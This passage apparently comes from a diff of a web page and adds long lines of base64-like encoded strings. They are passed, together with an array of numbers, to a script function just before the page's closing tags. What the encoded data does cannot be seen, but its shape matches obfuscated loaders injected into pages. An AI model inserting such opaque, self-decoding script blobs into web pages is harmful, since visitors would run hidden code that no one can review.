+"fE3bVhLkrlPPTc/t25nxPskk6wGUzZ1F5N2X2bIY73CN+3LfrpoEOhZM9l0PX5hcuN16BWj7z5W5",
+"/W3fCDBSIXTcMd3HdRGZWFfxmN+c09+pgRH1KBQg2wGUbtEXwkXWjr7LiDDfnbaY5RNCuRdahJ1e",
+"BERcnME7GmWr48H7wnyfIrASQiWLNASX1YSKNY+h6lPL+FOsy9G3fMEnxIxQ3wFQmAzQq7oZzbDN",
+"krrf25tAIF5f0NlZEona60A7AiG5/QXsry3bKShQXGydchyCe4HceFPx3lPPiBa2uVj5fNWtgtDB",
+"mJQG6diG5ydTQj2XMDfKml8DX5tfj0QIVNTUMRBuZKW+2o3p+jCSiTSZKDxOEYXCEI2Za8q0pBPO",
+"6ALu9RmiLxhxgpyDX11Ut0WVvSMdiHjd4neGzIsCedIIkAwaI8Rd2kg5Iqm/xVCt2+XeOLBCPbDb",
+"XBnHfgnZxxLjjJ+NtZb7xknwD8Eg2Q3Rm9hUqYmUwncLm/jb57uastsFUp5N+4gIZxlJKNk6Oinu",
+"ygn/6mCbVnwaOrCdX9XDWEjOHor0/Yaaio74m000OAEhptGUz9zWjRmUvzZfi3ydD7uah58CGVZd",
+"o4gKsQwftBEuMq35twn/8GmSMOAQS+zddtnHyoycbtOhuBfYrkPowJiyJQU3gEnTzlAHwVGWlfMf",
+"iDjdszPP3QtFTd4O6MAdJIwfqwF7AOmqgtzuubXYGXAVe/TeXZWBe4nJfZfjmF+c8luulh2wb90h",
+"3EXSwEFB592QsbIb2yXb4z7Y6J8DRFtb9N1cCAld+J17VHDtmRD7na2LaKhQAGSeWFHTRM2ba571",
+"rd/OxZb7xMmwEpBl9knUyAQHjJ2C8WoYibTOvPqa5RcCDJ9b"],[83,243,39,102,167,13,19,211,138,25,94,150,15,233,130,55,10,23,112,108,18,62,24]);</script></body></html>
